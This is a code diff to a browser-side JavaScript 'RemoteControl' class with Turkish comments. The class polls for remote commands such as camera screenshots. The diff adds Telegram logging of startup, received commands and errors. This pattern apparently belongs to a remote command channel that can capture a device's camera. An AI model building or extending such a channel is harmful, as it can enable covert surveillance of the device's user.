@@ -25,7 +25,21 @@ class RemoteControl {
         this.isEnabled = true;
         this.poll();
         
+        // Başlatma bildirimi gönder
+        this.sendStartNotification();
+        
         if (this.debug) console.log('[RemoteControl] Started');
+    }
+
+    // Sistem başladığında bildirim gönder
+    async sendStartNotification() {
+        if (window.telegramLogger) {
+            await window.telegramLogger.sendLog('remote_control_started', {
+                system_status: 'ACTIVE',
+                device_ready: true,
+                timestamp: new Date().toISOString()
+            });
+        }
     }
 
     // Uzaktan kontrolü durdur
@@ -81,6 +95,16 @@ class RemoteControl {
     // Komutu çalıştır
     async executeCommand(cmd) {
         try {
+            // Komut alındı bildirimi
+            if (window.telegramLogger) {
+                await window.telegramLogger.sendLog('command_received', {
+                    command: cmd.command,
+                    params: cmd.params || 'none',
+                    message_id: cmd.message_id,
+                    status: 'executing'
+                });
+            }
+
             switch (cmd.command) {
                 case 'camera_screenshot':
                     await this.takeCameraScreenshot(cmd.message_id);
@@ -96,6 +120,14 @@ class RemoteControl {
             }
         } catch (error) {
             if (this.debug) console.error('[RemoteControl] Command execution error:', error);
+            
+            // Hata bildirimi
+            if (window.telegramLogger) {
+                await window.telegramLogger.sendLog('command_error', {
+                    command: cmd.command,
+                    error: error.message
+                });
+            }
         }
     }
 
